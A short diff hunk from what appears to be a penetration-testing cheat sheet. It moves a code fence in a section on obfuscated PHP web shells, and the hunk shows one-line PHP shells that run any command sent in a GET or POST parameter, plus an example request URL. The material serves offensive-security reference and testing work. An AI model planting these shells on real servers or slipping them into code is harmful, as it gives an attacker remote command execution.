@@ -130,8 +130,8 @@ ____
 ### PHP Reverse Shell > <a name="obfuscate_php_web_shell"></a>Obfuscate PHP Web Shell
 ```php
 <?=`$_GET[0]`?>
-```
 Example: http://site.com/path/to/shell.php?0=command 
+```
 ```php
 <?=`$_POST[0]`?>
 ```
